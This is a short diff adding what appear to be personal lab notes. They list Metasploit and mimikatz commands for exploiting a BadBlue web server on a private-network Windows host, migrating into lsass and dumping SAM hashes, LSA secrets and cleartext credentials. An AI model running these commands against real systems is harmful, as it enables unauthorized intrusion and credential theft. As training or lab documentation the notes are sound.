@@ -1,0 +1,30 @@
+- nmap 10.6.21.171
+- nmap -sV 10.6.21.171
+- msfconsole
+- use exploit/windows/http/badblue_passthru
+- set RHOSTS 10.6.21.171
+- run
+- sysinfo
+- getuid
+- pgrep lsass
+- migrate LSASS_PID
+- getuid
+- using the kiwi module : 
+    - load kiwi
+    - ?
+    - creds_all
+    - lsa_dump_sam
+    - lsa_dump_secrets
+- using prebuilt mimikatz on kali
+    - cd c:\\Temp
+    - upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+    - shell
+    - .\mimikatz.exe
+    - privilege::debug
+        - Privilege '20' OK : mean that the session has the needed privilege
+    - lsadump::sam
+        - gives much more informations that kiwi
+    - lsadump::secrets
+        - the same output as the kiwi 
+    - sekurlsa 
+        - may display clear text if clear text password is enabled on the system
